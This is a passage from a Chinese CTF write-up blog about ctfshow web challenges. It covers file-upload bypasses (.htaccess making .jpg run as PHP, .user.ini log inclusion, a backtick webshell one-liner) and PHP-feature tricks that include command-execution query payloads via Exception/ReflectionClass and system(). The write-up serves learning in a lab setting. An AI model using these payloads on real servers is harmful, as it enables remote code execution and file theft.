class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">            <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意使用之前要导入php的gd库<br>然后注入即可，但是这里我的库没导入明白。所以尝试一下对比渲染前后两个文件。发现内容有部分不会改变，可以在不变处注入木马。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688892427399-bbc837a0-d38d-4ca2-beea-d9b59d3feb7b.png" alt="image.png"><br>试了一下 似乎不太行。<br>太重量级了 ，一直提示下不下来gd扩展。<br>气麻了。不做了。</p><h1 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h1><p>检测是否为zip，穿一个zip然后直接在bp里面抓包即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688899018551-9b58895b-38e1-4f92-831e-1d312225a70d.png" alt="image.png"></p><h1 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h1><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>使用<code>.htaccess</code>的一个要求就是使用apache<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688899252427-86a535b8-9d71-4995-9c36-56b8e1ecd69e.png" alt="image.png"><br>htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。<br>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg   <span class="comment">//将.png后缀的文件解析 成php</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688899639889-8d65e30b-7273-496a-82fd-4e5af74b68a3.png" alt="image.png"><br>再传一个jpg为后缀的一句话木马。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688899700671-4d857077-8ad6-4548-bc54-25ea14f1c8c6.png" alt="image.png"></p><h1 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h1><h3 id="基础免杀"><a href="#基础免杀" class="headerlink" title="基础免杀"></a>基础免杀</h3><p>过滤了关键字eval system<br>就简单用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`tac ../f*`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688900322936-79959956-1bac-4480-9a63-9177fc0a01a7.png" alt="image.png"><br>上传之后访问即可。但是注意，点击下载之后跳转链接是错误的。正确的连接<code>/upload/jichumiansha.php</code><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688900506632-4a8dd9e3-991c-4233-af39-1da09d8574f0.png" alt="image.png"></p><h1 id="web169"><a href="#web169" class="headerlink" title="web169"></a>web169</h1><h3 id="日志包含-1"><a href="#日志包含-1" class="headerlink" title="日志包含"></a>日志包含</h3><p>还是之前的.user.ini。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688900849727-63a7d2c3-edd5-40e0-a16d-129958b252d1.png" alt="20210423141358274.png"><br>contenttype要修改成如图的样式。<br>然后再传一个php文件。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688901084652-94e75a15-5c22-4c8a-bafa-86907f8ffa0d.png" alt="image.png"><br>注意图中UA，文件名，文件种类。<br>然后就是访问1.php了。<br><code>upload/1.php?2=tac ../f*</code></p><h1 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h1><h3 id="user-ini-GIF89A文件头"><a href="#user-ini-GIF89A文件头" class="headerlink" title=".user.ini GIF89A文件头"></a>.user.ini GIF89A文件头</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688901395850-cfc84364-443e-406e-bd88-c2c5572653f1.png" alt="image.png"><br>加个文件头即可。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web106-web131php特性篇（二）</title>
      <link href="/2023/07/09/web106-web131php%E7%89%B9%E6%80%A7%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2023/07/09/web106-web131php%E7%89%B9%E6%80%A7%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">  <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>) &amp;&amp; <span class="variable">$v1</span>!=<span class="variable">$v2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组和转为0e都行，这里图省事使用了数组绕过。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684334208070-bcca58a3-83a4-4cb2-a742-02362c1d614a.png" alt="image.png"></p><h1 id="web107-parse-str"><a href="#web107-parse-str" class="headerlink" title="web107 parse_str"></a>web107 parse_str</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">  <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">  <span class="title function_ invoke__">parse_str</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="title function_ invoke__">md5</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>parse_str</code>函数会存储值作为变量<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684334510177-e84f6494-6118-48b2-8afe-2446165f306e.png" alt="image.png"><br>因此题目的意思是将v1中flag值与v3中的MD5值相同，那么：<br>GET：<code>?v3=hello</code><br>POST：<code>v1=flag=5d41402abc4b2a76b9719d911017c592</code></p><h1 id="web108-ereg-null绕过和intval"><a href="#web108-ereg-null绕过和intval" class="headerlink" title="web108 ereg null绕过和intval"></a>web108 ereg null绕过和intval</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ereg</code>匹配函数，题目意思为c中只能出现字符，函数在NULL截断漏洞，%00截断绕过<br><code>strrev</code>反转字符串<br>0x36d对应的数值为877，需要反转一次变为778。<br>组合起来payload：<code>a%00778</code></p><h1 id="web109-异常处理类命令执行"><a href="#web109-异常处理类命令执行" class="headerlink" title="web109 异常处理类命令执行"></a>web109 异常处理类命令执行</h1><blockquote><p>异常处理类：<a href="http://c.biancheng.net/view/6253.html">h<del>ttp://c.biancheng.net/view/6253.html</del></a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接构造反射类（并没有想到，反射类还是没有太弄懂）<br><code>?v1=ReflectionClass&amp;v2=system(&quot;tac f*&quot;)</code><br>也可以用exception类，详情见题目下方链接。<br>Exception 异常处理类  payload: <code>?v1=Exception&amp;v2=system(&#39;cat fl36dg.txt&#39;)</code><br>同理：<code>?v1=mysqli&amp;v2=system(&#39;tac fl36dg.txt&#39;)</code><br>这些都是因为类的tostring魔术方法导致的执行。<br>也就是初始化一个mysqli类，但是实际上这个类的初始化时候传参不止这一个，所以是初始化失败的，但是由于其内部有魔术方法__toString：<br>如果类定义了toString方法，就能在测试时，echo打印对象体，对象就会自动调用它所属类定义的toString方法，格式化输出这个对象所包含的数据。<br>这时候就可以echo出来了。<br>同样内部类Exception也是可以的，这个类会把传入的参数输出出来，也是由__toString方法。</p><h2 id="备注："><a href="#备注：" class="headerlink" title="备注："></a>备注：</h2><p>反射类详情见web100方法二</p><h1 id="web110-php内置类-利用-FilesystemIterator-获取指定目录下的所有文件"><a href="#web110-php内置类-利用-FilesystemIterator-获取指定目录下的所有文件" class="headerlink" title="web110 php内置类 利用 FilesystemIterator 获取指定目录下的所有文件"></a>web110 php内置类 利用 FilesystemIterator 获取指定目录下的所有文件</h1><blockquote><p><a href="https://www.php.net/manual/zh/class.filesystemiterator.php">https://www.php.net/manual/zh/class.filesystemiterator.php</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用 FilesystemIterator 获取指定目录下的所有文件 <a href="http://phpff.com/filesystemiterator">http://phpff.com/filesystemiterator</a> <a href="https://www.php.net/manual/zh/class.filesystemiterator.php">https://www.php.net/manual/zh/class.filesystemiterator.php</a> getcwd()函数 获取当前工作目录 返回当前工作目录<br>payload：<code>?v1=FilesystemIterator&amp;v2=getcwd</code></p><h1 id="web111-引用变量和-GLOBALS-指针相关"><a href="#web111-引用变量和-GLOBALS-指针相关" class="headerlink" title="web111 引用变量和$GLOBALS 指针相关"></a>web111 引用变量和$GLOBALS 指针相关</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>想要执行getflag函数，那么v1必须为<code>ctfshow</code>，v2赋值为<code>GLOBALS</code>，这里运用到了全局变量。<br>然后再将v2的值赋给v1，再接着getFlag函数，打印v1，v1为全局变量的时候，即可打印出flag<br>实在没看懂，我们看看以下解释：<br>假设现在有以下两个变量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$v1</span> = <span class="string">&#x27;foo&#x27;</span>;  <span class="comment">// $v1 的值为字符串 &#x27;foo&#x27;</span></span><br><span class="line"><span class="variable">$v2</span> = <span class="string">&#x27;bar&#x27;</span>;  <span class="comment">// $v2 的值为字符串 &#x27;bar&#x27;</span></span><br><span class="line"><span class="variable">$bar</span> = <span class="string">&#x27;i am bar&#x27;</span>;</span><br></pre></td></tr></table></figure><p>现在调用 <code>getFlag</code> 函数，并将 <code>$v1</code> 和 <code>$v2</code> 作为引用参数传递给它：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>, <span class="variable">$v2</span>);</span><br></pre></td></tr></table></figure><p>在函数内部，<code>&quot;$$v1 = &amp;$$v2;&quot;</code> 这一行代码将把 <code>$v2</code> 的引用赋值给了以 <code>$v1</code> 变量的值 <code>&#39;foo&#39;</code> 作为变量名的新变量。也就是说，在函数执行完毕后，我们得到了另一个变量 <code>$foo</code>，它指向了和 <code>$bar</code> 相同的内存地址。<br>因此，如果我们在调用 <code>getFlag</code> 函数之后输出 <code>$foo</code> 变量的值，应该会得到 <code>$bar</code>的值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$foo</span>);  <span class="comment">// 输出 string(8) &quot;i am bar&quot;</span></span><br></pre></td></tr></table></figure><p>测试如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684337748600-cf869928-8df9-4731-ac96-582deef8fea3.png" alt="image.png"><br>PS：byd我最开始还让gpt忽悠了，后来反应过来了，改回来了。再提醒一下，不要忘记编程语言的基础，<code>=</code>是赋值，不是取等！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$v1</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="variable">$v2</span> = <span class="string">&#x27;GLOBALS&#x27;</span>;</span><br><span class="line"><span class="variable">$$v1</span> = &amp;<span class="variable">$$v2</span>;</span><br><span class="line"><span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>和指针类似，稍微理一下，也就是$a给予了和$GLOBALS相同的超全局变量。最后vardump的是$a。</p><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>global和$GLOBALS：<a href="https://www.php.cn/php-weizijiaocheng-369541.html">https://www.php.cn/php-weizijiaocheng-369541.html</a></p><h1 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h1><h3 id="考点：php伪协议绕过is-file-highlight-file-对于php伪协议的使用"><a href="#考点：php伪协议绕过is-file-highlight-file-对于php伪协议的使用" class="headerlink" title="考点：php伪协议绕过is_file+highlight_file  对于php伪协议的使用"></a>考点：php伪协议绕过is_file+highlight_file  对于php伪协议的使用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">function <span class="built_in">filter</span>($file)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,$file))&#123;</span><br><span class="line">        die(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(<span class="built_in">filter</span>($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    echo <span class="string">&quot;hacker!&quot;</span>;</span><br><span 